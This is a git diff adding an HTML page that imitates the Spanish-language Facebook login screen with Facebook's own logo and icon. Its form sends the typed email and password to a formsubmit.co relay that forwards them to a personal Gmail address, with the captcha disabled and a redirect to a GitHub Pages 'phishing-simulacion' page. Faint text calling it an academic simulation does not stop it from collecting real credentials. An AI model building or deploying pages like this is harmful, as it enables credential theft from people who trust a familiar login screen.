@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – Inicia sesión o regístrate</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+  <style>
+    body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
+    .container { width: 100%; max-width: 400px; margin: 80px auto; padding: 30px; background: #fff;
+                 border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .logo { text-align: center; margin-bottom: 20px; }
+    .logo img { width: 200px; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd;
+      border-radius: 6px; font-size: 16px;
+    }
+    input[type="submit"] {
+      width: 100%; padding: 12px; background-color: #1877f2; color: #fff;
+      border: none; border-radius: 6px; font-size: 16px; font-weight: bold;
+      cursor: pointer;
+    }
+    .note-discreta { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+    </div>
+    <form action="https://formsubmit.co/erickgamer833@gmail.com" method="POST">
+      <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
+      <input type="password" name="password" placeholder="Contraseña" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://ericsps8w.github.io/phishing-simulacion/gracias.html">
+      <input type="submit" value="Iniciar sesión" title="⚠️ Simulación educativa. No uses datos reales.">
+    </form>
+    <div class="note-discreta">
+      ⚠️ Simulación académica. No ingreses datos reales.
+    </div>
+  </div>
+</body>
+</html>
+agregar index.html corregido
